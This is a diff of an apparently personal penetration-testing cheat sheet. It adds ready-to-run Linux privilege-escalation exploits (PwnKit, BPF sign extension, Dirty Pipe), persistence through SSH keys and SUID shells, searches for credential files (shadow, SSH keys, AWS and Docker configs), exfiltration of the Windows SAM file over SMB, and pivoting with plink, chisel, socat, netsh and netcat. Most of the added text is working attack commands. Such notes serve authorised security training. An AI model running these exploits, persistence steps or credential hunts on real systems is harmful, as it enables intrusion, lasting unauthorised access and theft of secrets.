+curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o pwnkit
+chmod +x ./pwnkit
+./pwnkit # interactive shell
+./pwnkit 'id' # single command
+# it will tell you nicely if the exploit fails when the system is patched.
 ```
-myuser ALL=(ALL) NOPASSWD: ALL
+
+
+#### 6.2.8.3 Get-Rekt BPF Sign Extension LPE
+
+[CVE-2017-16995](https://nvd.nist.gov/vuln/detail/CVE-2017-16995) is effective against Linux kernel 4.4.0 - 4.14.10.
+- Debian 9
+- Ubuntu 14.04 - 16.04
+- Mint 17 - 18
+- Fedora 25 - 27
+
+```sh
+# on kali, grab source
+searchsploit -m 45010
+python -m http.server 80
+
+# on victim, download, compile, and execute
+wget LISTEN_IP/45010.c -O cve-2017-16995
+gcc cve-2017-16995.c -o cve-2017-16995
 ```
 
-### 6.4.3 Setting SUID bit
+
+#### 6.2.8.4 Dirty Pipe
+
+[CVE-2022-0847](https://nvd.nist.gov/vuln/detail/CVE-2022-0847) affects Linux kernels 5.8.x up. The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102.
+- RHEL 8.0 - 8.4
+- Fedora 35
+
+```sh
+wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c
+python -m http.server 80
+
+# on victim
+wget LISTEN_IP/exploit.c
+gcc exploit.c -o exploit # may need to compile locally with "-static"
+./exploit # if statically compiled, may complain about system() failing, but ok
+su - # use password 'aaron'
+
+# to restore to pre-exploit state
+# if you get error "su: must be run from a terminal"
+# or error "system() function call seems to have failed :("
+# but the exploit successfully changed root's password in /etc/passwd
+# - login as root with the password aaron.
+# - restore /etc/passwd
+mv /tmp/passwd.bak /etc/passwd
+```
+
+
+
+## 6.3 Linux Persistence
+
+Many of the techniques for privilege escalation can be used to also maintain persistence (particularly ones where you modify a file).
+
+### 6.3.1 Add SSH key to authorized_keys
+
+You can add your key to either `root` or a user with (passwordless) sudo.
+
+```sh
+# on kali, make ssh key and copy it
+ssh-keygen -C "derp" -N "" -f ./derp-ssh
+xclip -sel clip derp-ssh.pub
+
+# on victim (as root):
+# make sure .ssh directory exists with right permissions
+mkdir -pm700 /root/.ssh
+# add key to authorized_keys
+echo "PASTEYOURSSHPUBKEY" >> /root/.ssh/authorized_keys
+```
+
+### 6.3.2 Set SUID bit
 
 If you set the SUID bit of a root-owned executable, like `/bin/sh` or `less`
 or `find` (see [GTFOBins](https://gtfobins.github.io/#+shell) for more), you can use those to give yourself a root shell. This is a kind of privesc backdoor.
@@ -5116,12 +5382,20 @@ or `find` (see [GTFOBins](https://gtfobins.github.io/#+shell) for more), you can
 sudo chmod u+s /bin/sh
 ```
 
-## 6.5 Data Wrangling on Linux
+
+## 6.4 Miscellaneous Linux Commands
+
+```sh
+# make sure terminal environment is good, if not working right
+export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
+export TERM=xterm-256color
+```
+
+
+### 6.4.1 Awk & Sed
 
 Sometimes there is a lot of extra garbage in the loot you grab. It's nice to
 be able to quickly sift through it to get the parts you care about.
-
-### 6.5.1 Awk & Sed
 
 ```sh
 # grab lines of text between start and end delimiters.
@@ -5131,7 +5405,7 @@ sed -n '/PAT1/,/PAT2/{//!p;}' FILE
 sed '/PAT1/,/PAT2/!d;//d' FILE
 ```
 
-## 6.6 Linux Files of Interest
+## 6.5 Linux Files of Interest
 
 ```sh
 # quick command to grab the goods
@@ -5164,30 +5438,49 @@ Also check out [Linux Files of Interest](#6.13%20Linux%20Files%20of%20Interest).
 
 ```sh
 /etc/passwd
-/etc/shadow
-/etc/group
-/etc/hosts
-/etc/issue
-/etc/motd
 
-/etc/mysql/my.cnf
-/usr/local/etc/apache22/httpd.conf
-/etc/apache2/apache2.conf
-/etc/httpd/conf/httpd.conf
+# "shadow" files usually have credentials
+find / -path '/usr' -prune -o -type f -readable \( -iname 'shadow*' -o -iname '.shadow*' \) -ls 2>/dev/null
 
-/home/USERNAME/.ssh/id_rsa
-/home/USERNAME/.bash_history
-/home/USERNAME/.profile
-/home/USERNAME/.mysql_history
+# find ssh private keys
+find / -xdev -type f -readable -name 'id_*' -exec grep -q BEGIN {} \; -ls 2>/dev/null
 
-/root/.bash_history
-/root/.profile
-/root/.ssh/id_rsa
-/root/.vnc/passwd
+# Wordpress config, can have credentials
+find / -type f -readable -name wp-config.php -ls 2>/dev/null
+# normally at:
+/var/www/wordpress/wp-config.php
 
-# Web server files, usually in webroot
-.htaccess
-config.php
+# look for other php config files that may have creds
+find / -type f -readable -name '*config.php' -ls 2>/dev/null
+
+# Apache htaccess files might indicate files/directories with sensitive info
+find / -type f -readable -name .htaccess -ls 2>/dev/null
+
+# mysql configs, can have creds
+find / -type f -readable -name '*my.cnf' -ls 2>/dev/null
+
+# find *_history files (bash, zsh, mysql, etc.), which may have sensitive info
+find / -xdev -type f -readable -name '*_history' -ls 2>/dev/null
+
+# AWS credentials
+find / -xdev -type f -readable -path '*/.aws/*' \( -name credentials -o -name config \) -ls 2>/dev/null
+
+# Docker config, has credentials
+find / -xdev -type f -readable -path '*/.docker/*' -name config.json -ls 2>/dev/null
+
+# GNUPG directory
+find / -xdev -type d -readable -name '.gnupg' -ls 2>/dev/null
+
+# Confluence config has credentials
+find / -xdev -type f -readable -name confluence.cfg.xml -ls 2>/dev/null
+# normally at:
+/var/atlassian/application-data/confluence/confluence.cfg.xml
+
+# VNC passwd files have creds
+find / -xdev -type f -path '*/.*vnc/*' -name passwd -ls 2>/dev/null
+
+# rarely, .profile files have sensitive info
+find / -xdev -type f -readable -name '.*profile' -ls 2>/dev/null
 ```
 
 
@@ -5283,6 +5576,8 @@ Get-ChildItem -Path C:\ -File -Recurse -ErrorAction SilentlyContinue -Include *.
 
 
 ## 7.2 File Transfers
+
+**Great resource**: [HackTricks - Exfiltration](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration) 🎉 🎉 🎉
 
 ### 7.2.1 Netcat transfer
 
@@ -5392,8 +5687,13 @@ Mounting/hosting share on Kali
 sudo mount -t cifs -o vers=1.0 //REMOTE_IP/'Sharename' /mnt/smbshare
 
 # host SMB share on kali (note: 'share' is share name)
-sudo impacket-smbserver share .
+sudo impacket-smbserver -smb2support share .
 # to use for exfil: copy C:\Windows\Repair\SAM \\KALI_IP\share\sam.save
+
+# To work with Windows 10+
+impacket-smbserver -smb2support -user derp -password herpderp share .
+# to connect on Windows with creds:
+# net use \\10.10.14.14 /user:derp herpderp 
 ```
 
 Using curl to upload file to windows SMB share
@@ -5419,7 +5719,7 @@ python3 -m pyftpdlib --help
 # start server on port 21, allowing anonymous write
 sudo python3 -m pyftpdlib -p 21 -w
 # start server on port 2121 for specific username/password
-python3 -m pyftpdlib -w -u derp -P herpaderp
+python3 -m pyftpdlib -w -u derp -P herpderp
 ```
 
 Then on Windows box, create `ftpup.bat`:
@@ -5428,7 +5728,7 @@ Then on Windows box, create `ftpup.bat`:
 :: change server IP and Port as required
 echo open LISTEN_IP 2121> ftpcmd.dat
 echo user derp>> ftpcmd.dat
-echo herpaderp>> ftpcmd.dat
+echo herpderp>> ftpcmd.dat
 echo bin>> ftpcmd.dat
 echo put %1>> ftpcmd.dat
 echo quit>> ftpcmd.dat
@@ -5617,11 +5917,26 @@ AllowTcpForwarding yes
 After making changes to the `sshd_config` file you must restart `sshd` for changes to take effect.
 
 ```bash
+# all commands executed as ROOT
+
 # View the SSH server status.
 systemctl status ssh
 
-# Restart the SSH server.
-systemctl restart ssh
+# Restart the SSH server (Debian, Ubuntu, Mint)
+/etc/init.d/ssh restart # older SysV systems
+service ssh restart # if service cmd installed
+systemctl restart ssh # newer systemd systems
+
+# for RHEL, Fedora, CentOS, Alma, Rocky, do...
+/etc/init.d/sshd restart # older SysV systems
+service sshd restart # if service command installed
+systemctl restart sshd # newer systems w/ systemd
+
+# FreeBSD, OpenBSD restart
+/etc/rc.d/sshd restart
+service sshd restart
+
+# more at: https://www.cyberciti.biz/faq/howto-restart-ssh/
 
 # Stop the SSH server.
 systemctl stop ssh
@@ -5635,9 +5950,9 @@ Here are common tunneling commands (using `-g` flag forces the ssh option
 
 ```sh
 ## Local Forwarding ###################################
-# SSH local port forward to reach internal_server_ip:port via jumpbox_ip
-ssh jumper@jumpbox_ip -p 2222 -L 4445:internal_server_ip:445
-# Now `smbclient localhost -p 4445 -N -L` will let us list the SMB shares of
+# SSH local port forward from DMZ box to reach internal_server_ip:port via jumpbox_ip
+ssh jumper@jumpbox_ip -p 2222 -L 0.0.0.0:4445:internal_server_ip:445
+# Now `smbclient //DMZ_IP -p 4445 -N -L` on kali will let us list the SMB shares of
 # internal_server_ip, which is only reachable from jumpbox_ip
 
 # SSH local port forward to send traffic from our local port 8080 to victim's
@@ -5679,11 +5994,13 @@ ssh jumper@jumpbox_ip -p 2222 -D 1080
 curl -x socks5://127.0.0.1:1080 http://www.lolcats.com
 # You can also set up firefox to browse through SOCKS proxy through GUI settings
 
-# to proxy DNS through the new SSH SOCKS tunnel, set the following line in
-# /etc/proxychains4.conf:
-proxy_dns
-# and set the following env variable:
-export PROXYRESOLVE_DNS=REMOTE_DNS_SVR
+
+## Remote Dynamic forwarding (SOCKS4/5) ################################
+# Connecting from jumpbox -> attacker, open SOCKS proxy on
+# attacker that forwards traffic to internal net. Useful
+# when firewall blocking inbound traffic, but allows ssh out.
+# OpenSSH _client_ needs to be version 7.6 or above to use.
+ssh -R 1080 attacker@attacker_ip
 
 
 ## ProxyJump ########################################
@@ -5700,10 +6017,15 @@ ssh -J jumper@jumpbox1_ip proxyuser@2nd_box -D 1080
 ## Miscellaneous ###################################
 # bypass first time prompt when have non-interactive shell
 ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" ...
+
+# only allow a specific ssh key ability to port forward through port 6969:
+# add following to ~/.ssh/authorized_keys
+echo "from=\"$from_addr\",command=\"/usr/sbin/false\",no-agent-forwarding,no-X11-forwarding,no-pty,permitopen=\"localhost:6969\" $pubkey" >> ~/.ssh/authorized_keys
+# where $from_addr is the IP that will be connecting to kali, and $pubkey is
+# the full text of the id_rsa.pub file that you are using for this purpose.
 ```
 
-When repeatedly using the same ProxyJump, it is easier to use if you set up `ssh_config`
-appropriately. See [here](https://medium.com/maverislabs/proxyjump-the-ssh-option-you-probably-never-heard-of-2d7e41d43464) for more details. Summary of how to do it:
+When repeatedly using the same ProxyJump, it is easier to use if you set up `ssh_config` appropriately. See [here](https://medium.com/maverislabs/proxyjump-the-ssh-option-you-probably-never-heard-of-2d7e41d43464) for more details. Summary of how to do it:
 
 ```
 Host jumpbox1
@@ -5737,13 +6059,14 @@ Host target
 You can also set up OpenSSH (v4.3+) to act as a full VPN to tunnel traffic. See
 [here](https://wiki.archlinux.org/index.php/VPN_over_SSH#OpenSSH's_built_in_tunneling) for how to do it. (`-w` command flag, or `Tunnel` ssh_config option).
 
-**PRO TIP**: If setting up a remote ssh tunnel purely to (remote-)forward traffic, use the following flags: `-fNTgR`.
+**PRO TIP**: If setting up a remote ssh tunnel purely to (remote-)forward traffic, use the following flags: `-gfNTR`.
 
 - `-f` forks the ssh process into the background after
 connection is established so you can keep using your terminal.
 - `-N` and `-T` say "No" commands can be executed and no "TTY" is allocated.
   Using these together prevents command execution on the remote host (jump box)
 - `-g` and `-R` enable "Gateway" ports and do "Remote" port forwarding
+
 
 ### 8.1.1 Ad Hoc SSH Port Forwards
 
@@ -5760,22 +6083,149 @@ The ssh prompt will change to `ssh>` when you enter ad hoc command line mode.
 
 Typing `help` in ad hoc command line mode shows command syntax examples.
 
+### 8.1.2 SSH on Windows
+
+SSH comes with Windows 10 by default since 1803 (and optionally since 1709). It's found in the `%systemdrive%\Windows\System32\OpenSSH` folder. Use `ssh.exe` just like `ssh` on Linux.
+
+```powershell
+# check if SSH is on Windows
+where.exe ssh
+
+# check if version >= 7.6, so we can use Reverse Dynamic forwarding
+ssh.exe -V
+```
+
+The other option is to copy **`plink.exe`** over to the Windows box:
+
+```sh
+# grab copy of plink and host on http for Windows victim
+cp /usr/share/windows-resources/binaries/plink.exe .
+python -m http.server 80
+
+# on windows, download it
+iwr http://LISTEN_IP/plink.exe -outfile C:\Windows\Temp\plink.exe
+
+# use plink similar to ssh, with addition of '-l USER -pw PASSWD'
+# Note: echo y accepts host key on non-interactive shells.
+# This command opens up the victim's firewalled RDP to your kali box.
+cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l portfwd -pw herpderp -N -R 3389:127.0.0.1:3389 ATTACKER_IP
+```
+
+
+### 8.1.3 Creating restricted user for ssh port forwarding only
+
+This is valuable for working with `plink.exe` on Windows, which requires entering your password in plaintext into the command line, which isn't ideal for security.
+
+First create the restricted `portfwd` user on your Kali box:
+
+```sh
+# create restricted user
+# change 'herpderp' to whatever password you desire
+# keep space in front of command to avoid it getting saved in shell history
+ sudo useradd -c "ssh port forwarding only" --no-create-home --home-dir "/nonexistent" --no-user-group --system --shell "/usr/sbin/nologin" --password "$(openssl passwd -6 herpderp)" portfwd
+
+# removing the user:
+sudo userdel portfwd
+```
+
+Then add the following to the bottom of your `/etc/ssh/sshd_config`:
+
+```
+Match User portfwd
+   #AllowTcpForwarding yes
+   #X11Forwarding no
+   #PermitTunnel no
+   #GatewayPorts no
+   #PermitOpen localhost:6969
+   AllowAgentForwarding no
+   PermitTTY no
+   ForceCommand /usr/sbin/false
+```
+
+Finally, you MUST include the `-N` flag (no commands) when connecting over ssh, so you don't get booted when `/usr/sbin/false` returns an error.
+
+
 ## 8.2 SOCKS Proxies and proxychains
 
 `proxychains` is great for tunneling TCP traffic through a SOCKS proxy (like
 what `ssh -D` and `chisel -D` give you).
 
+Add a proxy configuration line at the bottom of `/etc/proxychains4.conf`. The config format is `socks5 PROXY_IP PORT`.
+
 ```sh
 # make sure proxychains is confgured for SOCKS:
 sudo sh -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf'
+# prefer socks5 because it supports UDP (DNS!)
+# if your proxy doesn't support it, use socks4
 
 # using proxychains: put your command after 'proxychains -q'
 # '-q' is quiet, so you don't see stderr msgs for each connection
 sudo proxychains -q nmap -v -sT -F --open -Pn $VICTIM_IP
 sudo proxychains -q nmap -v -sU -F --open -Pn $VICTIM_IP
+
+
+# to proxy DNS through the new SSH SOCKS tunnel, set the following line in
+# /etc/proxychains4.conf:
+proxy_dns
+# and set the following env variable:
+export PROXYRESOLVE_DNS=REMOTE_DNS_SVR
+
+# to speed up scanning with nmap through proxychains, set the following in
+# /etc/proxychains.conf:
+tcp_read_time_out 1000
+tcp_connect_time_out 500
 ```
 
-## 8.3 Bending with iptables
+> ⚠ **NOTE**: To scan TCP with nmap through a SOCKS proxy, only full-connection scans are possible! (nmap option flag `-sT`). It's also often necessary to tell nmap to assume the host is up (`-Pn`). Until nmap's `--proxy` flag is stable, use `proxychains nmap` instead.
+> 
+> By default, Proxychains is configured with very high time-out values. This can make port scanning really slow. Lowering the `tcp_read_time_out` and `tcp_connect_time_out` values in `/etc/proxychains4.conf` will force time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times. I used `tcp_read_time_out 1000` and `tcp_connect_time_out 500` successfully.
+
+
+## 8.3 Bending with socat
+
+On the jump-box:
+
+```sh
+# basic port forwarding with socat listener
+sudo socat -ddd TCP-LISTEN:80,fork TCP:REMOTE_HOST_IP:80
+# optionally, do same thing bound to specific interface IP
+sudo socat -ddd TCP-LISTEN:80,bind=10.0.0.2,fork TCP:REMOTE_HOST_IP:80
+
+# UDP relay
+socat -ddd -u UDP-RECVFROM:1978,fork,reuseaddr UDP-SENDTO:10.1.1.89:1978
+
+# IPv4 to IPv6 tunnel
+sudo socat -ddd TCP-LISTEN:110,reuseaddr,fork 'TCP6:[fe80::dead:beef%eth0]:110'
+
+# TCP to Unix Domain Socket
+socat -ddd TCP-LISTEN:1234,reuseaddr,fork UNIX-CLIENT:/tmp/foo
+# more secure version
+socat -ddd TCP-LISTEN:1234,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/foo
+```
+
+General socat syntax
+
+```
+socat [options] <address> <address>
+```
+
+Where `<address>` is in the form `protocol:ip:port` or `filename` or `shell-cmd`
+
+Other useful addresses:
+ - `STDIN` (equivalently, `-`), `STDOUT`, and `STDIO` (both stdin and stdout)
+ - `EXEC:cmdline` or `SYSTEM:shell-cmd`
+ - `FILE:/path/to/file` - log output to file
+ - `FILE:$(tty),rawer` - a raw terminal
+ - `PTY,link=/tmp/mypty,rawer,wait-slave`
+ - `UDP:host:port` and `UDP-LISTEN:port`
+ - `TCP:host:port` and `TCP-LISTEN:port`
+ - `OPENSSL:host:port` and `OPENSSL-LISTEN:host:port`
+ - `UNIX-CONNECT:filename` and `UNIX-LISTEN:filename`
+ - `PIPE` or `PIPE:filename`
+
+## 8.4 Bending with iptables
+
+Iptables forwarding requires `root` privileges.
 
 Here's how to do traffic shaping to redirect traffic on port 80 through a pivot
 host to your desired remote host. Note, it's usually also good practice to
@@ -5801,58 +6251,19 @@ sudo iptables -P FORWARD ACCEPT
 sudo sysctl -w net.ipv4.ip_forward=1
 # -- or temporarily until reboot --
 echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+# or /proc/sys/net/ipv4/conf/IFNAME/forwarding
+
 # make iptables rules persistent (optional)
 sudo service iptables-persistent save
 ```
 
 
 
-## 8.4 Bending with socat
-
-On the jump-box:
-
-```sh
-# basic port forwarding with socat listener
-sudo socat TCP4-LISTEN:80,fork TCP4:REMOTE_HOST_IP:80
-# optionally, do same thing bound to specific interface IP
-sudo socat TCP4-LISTEN:80,bind=10.0.0.2,fork TCP4:REMOTE_HOST_IP:80
-
-# UDP relay
-socat -u UDP-RECVFROM:1978,fork,reuseaddr UDP-SENDTO:10.1.1.89:1978
-
-# IPv4 to IPv6 tunnel
-sudo socat TCP-LISTEN:110,reuseaddr,fork 'TCP6:[fe80::dead:beef%eth0]:110'
-
-# TCP to Unix Domain Socket
-socat TCP-LISTEN:1234,reuseaddr,fork UNIX-CLIENT:/tmp/foo
-# more secure version
-socat TCP-LISTEN:1234,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/foo
-```
-
-General socat syntax
-
-```
-socat [options] <address> <address>
-```
-
-Where `<address>` is in the form `protocol:ip:port` or `filename` or `shell-cmd`
-
-Other useful addresses:
- - `STDIN` (equivalently, `-`), `STDOUT`, and `STDIO` (both stdin and stdout)
- - `EXEC:cmdline` or `SYSTEM:shell-cmd`
- - `FILE:/path/to/file` - log output to file
- - `FILE:$(tty),rawer` - a raw terminal
- - `PTY,link=/tmp/mypty,rawer,wait-slave`
- - `UDP:host:port` and `UDP-LISTEN:port`
- - `TCP:host:port` and `TCP-LISTEN:port`
- - `OPENSSL:host:port` and `OPENSSL-LISTEN:host:port`
- - `UNIX-CONNECT:filename` and `UNIX-LISTEN:filename`
- - `PIPE` or `PIPE:filename`
-
 ## 8.5 Bending with rinetd
 
-Once installed (`apt install -y rinetd`), you can easily specify rinetd forwarding rules by changing the
-config settings in `/etc/rinetd.conf`. `rinetd` acts as a persistently-running service that does redirection.
+Better suited for **long-term** redirections.
+
+Once installed (`apt install -y rinetd`), you can easily specify rinetd forwarding rules by changing the config settings in `/etc/rinetd.conf`. `rinetd` acts as a persistently-running service that does redirection.
 
 Redirection rules are in the following format:
 
@@ -5860,12 +6271,9 @@ Redirection rules are in the following format:
 bindaddress bindport connectaddress connectport
 ```
 
-The `kill -1` signal (`SIGHUP`) can be used to cause rinetd to reload its
-configuration file without interrupting existing connections. Under Linux
-the process id is saved in the file `/var/run/rinetd.pid` to facilitate the
-`kill -HUP`. Or you can do a hard restart via `sudo service rinetd restart`.
+The `kill -1` signal (`SIGHUP`) can be used to cause rinetd to reload its configuration file without interrupting existing connections. Under Linux the process id is saved in the file `/var/run/rinetd.pid` to facilitate the `kill -HUP`. Or you can do a hard restart via `sudo service rinetd restart`.
 
-## 8.6 Bending with netsh
+## 8.6 Bending with netsh on Windows
 
 If you own a dual-homed internal Windows box that you want to pivot from, you
 can set up port forwarding using the `netsh` utility.
@@ -5876,29 +6284,45 @@ can set up port forwarding using the `netsh` utility.
 # NOTE: before you start, make sure IP Helper service is running
 
 # establish IPv4 port forwarding from windows external IP to internal host
-netsh interface portproxy add v4tov4 listenport=4445 listenaddress=WIN_EXT_IP connectport=445 connectaddress=INTERNAL_VICTIM_IP
-# example opening mysql connections to the outside on port 33306
-netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=33306 connectaddress=127.0.0.1 connectport=3306
+netsh interface portproxy add v4tov4 listenport=4445 listenaddress=0.0.0.0 connectport=445 connectaddress=INTERNAL_VICTIM_IP
+# example opening mysql connections to the outside on port 33066
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=33066 connectaddress=127.0.0.1 connectport=3306
 
-# you also need to open a firewall rule to allow your inbound 4445 traffic
-netsh advfirewall firewall add rule name="fwd_4445_rule" protocol=TCP dir=in localip=WIN_EXT_IP localport=4445 action=allow
+# confirming your port forwarding rule was added:
+netsh interface portproxy show all
+
+# confirming your port is actually listening:
+netstat -anp TCP | findstr "4445"
+
+# you also need to open a firewall rule to allow your inbound traffic (4445 in example)
+# note: if you want to restrict it to a specific interface IP, add "localip=EXT_WIN_IP"
+netsh advfirewall firewall add rule name="derp" protocol=TCP dir=in action=allow localport=4445
+
+# on kali, check port is "open", not "filtered"
+sudo nmap -T4 -sS -Pn -n -p4445 WINDOWS_IP
+
+# removing firewall hole:
+netsh advfirewall firewall delete rule name="derp"
 ```
 
 ## 8.7 Bending with sshuttle
 
-[Sshuttle](https://sshuttle.readthedocs.io/en/stable/usage.html) is a python library that
-handles setting up a combination of IPTABLES rules and SSH proxy tunnels to transparently
-route all traffic to a target internal subnet easily.
+[Sshuttle](https://sshuttle.readthedocs.io/en/stable/usage.html) is a python library that handles setting up a combination of IPTABLES rules and SSH proxy tunnels to transparently route all traffic to a target internal subnet easily.
 
 ```sh
-# the CIDR IP is the target subnet you want to proxy access to.
-sshuttle --dns -r user@jumpbox_ip 10.1.1.0/0
+# sshuttle is most useful when you combine it with a multihop
+# configuration like so:
+# kali -> jumpbox1 (socat listening on 2222) -> DMZ_net (10.1.1.0/24) -> jumpbox2 (ssh) -> internal_net (172.16.2.0/24)
+
+# on kali, run:
+# the CIDR IPs are the target subnets you want sshuttle to route
+# through your tunnel transparently.
+sshuttle --dns -r jumpbox2_user@jumpbox1_ip:2222 10.1.1.0/24 172.16.2.0/24
 ```
 
 ## 8.8 Bending with chisel
 
-[Chisel](https://github.com/jpillora/chisel) lets you securely tunnel through
-firewalls and set up a SOCKS proxy through your tunnel.
+[Chisel](https://github.com/jpillora/chisel) lets you securely tunnel through firewalls and set up a SOCKS proxy through your tunnel.
 
 [Basic SOCKS usage](https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29)
 
@@ -5916,6 +6340,8 @@ chisel-x64.exe client attacker_ip:8080 R:socks
 
 ## 8.9 Bending with netcat
 
+Netcat combined lets you do traffic bending. It's a crude (but effective) tool.
+
 ```powershell
 # WINDOWS pivot
 # enter temporary directory to store relay.bat
@@ -5928,8 +6354,10 @@ nc –L -p LISTEN_PORT –e relay.bat
 
 ```sh
 # LINUX pivot
+# requires named pipe to join sender & receiver
 mkfifo /tmp/bp  # backpipe
 nc –lnp LISTEN_PORT 0<bp | nc $VICTIM_IP VICTIM_PORT | tee bp
+# 'tee' lets you inspect bytes on the wire
 ```
 
 # 9 Miscellaneous
@@ -6079,3 +6507,4 @@ References:
 
 - [List of tags recognized by `exiftool`](https://exiftool.org/TagNames/)
 - [Exiftool download](https://exiftool.org) - shows list of supported files
+
